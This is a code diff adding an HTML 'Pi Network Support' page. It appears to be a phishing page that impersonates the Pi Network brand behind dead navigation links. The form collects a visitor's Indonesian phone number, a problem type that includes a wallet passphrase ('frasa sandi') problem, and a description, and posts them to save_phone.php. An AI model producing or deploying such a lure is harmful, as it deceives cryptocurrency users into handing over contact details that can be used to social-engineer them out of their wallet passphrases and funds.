@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Support</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .navbar {
+            background-color: #2c1233;
+            padding: 10px 20px;
+            width: 100%;
+        }
+
+        .navbar-brand {
+            color: #fbbf24;
+            font-weight: bold;
+        }
+
+        .navbar-nav .nav-link {
+            color: white;
+        }
+
+        .navbar-nav .nav-link:hover {
+            color: #fbbf24;
+        }
+
+        .content {
+            width: 100%;
+            max-width: 800px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #fbbf24;
+        }
+
+        .btn-primary {
+            background-color: #eecc0b;
+            border: none;
+        }
+
+        .btn-primary:hover {
+            background-color: #f19915;
+        }
+    </style>
+</head>
+
+<body>
+    <nav class="navbar navbar-expand-lg w-100">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="#">Pi Network</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="blockchainDropdown" role="button"
+                            data-bs-toggle="dropdown" aria-expanded="false">Pi Blockchain</a>
+                        <ul class="dropdown-menu" aria-labelledby="blockchainDropdown">
+                            <li><a class="dropdown-item" href="#">Overview</a></li>
+                            <li><a class="dropdown-item" href="#">Explorer</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="developersDropdown" role="button"
+                            data-bs-toggle="dropdown" aria-expanded="false">Developers</a>
+                        <ul class="dropdown-menu" aria-labelledby="developersDropdown">
+                            <li><a class="dropdown-item" href="#">Docs</a></li>
+                            <li><a class="dropdown-item" href="#">API</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">About Us</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Community</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Support</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+
+    <div class="content p-4">
+        <h2>Pi Network Support</h2>
+        <p class="text-center">We are ready to help you. Please select the type of problem and describe your problem.
+        </p>
+        <form action="save_phone.php" method="POST" id="supportForm">
+            <div class="mb-3">
+                <label class="form-label">Select Problem:</label>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="issue" value="Login Issue" id="loginIssue">
+                    <label class="form-check-label" for="loginIssue">Login problem</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="issue" value="Payment Issue" id="Frasa">
+                    <label class="form-check-label" for="Frasa">Frasa sandi problem</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="issue" value="Other" id="otherIssue">
+                    <label class="form-check-label" for="otherIssue">Other</label>
+                </div>
+            </div>
+            <div class="mb-3">
+                <label class="form-label">NO HP:</label>
+                <input type="text" class="form-control" id="phone" name="phone" placeholder="Enter your no HP +62"
+                    required>
+            </div>
+            <div class="mb-3">
+                <label class="form-label">Describe the problem in more detail:</label>
+                <textarea class="form-control" id="description" name="description" rows="4"
+                    placeholder="Describe your problem" required></textarea>
+            </div>
+            <button type="submit" class="btn btn-primary w-100">Send</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("supportForm").addEventListener("submit", function (event) {
+            let issue = document.querySelector('input[name="issue"]:checked');
+            let phone = document.getElementById("phone").value;
+            let description = document.getElementById("description").value;
+
+            if (!issue) {
+                alert("Select Problem.");
+                event.preventDefault(); // Mencegah form terkirim jika belum memilih
+                return;
+            }
+
+            if (phone.trim() === "") {
+                alert("Enter your phone number.");
+                event.preventDefault();
+                return;
+            }
+
+            if (description.trim() === "") {
+                alert("Enter your description.");
+                event.preventDefault();
+                return;
+            }
+
+            alert("Report sent\nIssue: " + issue.value + "\nNo HP: " + phone + "\nDescription: " + description);
+        });
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
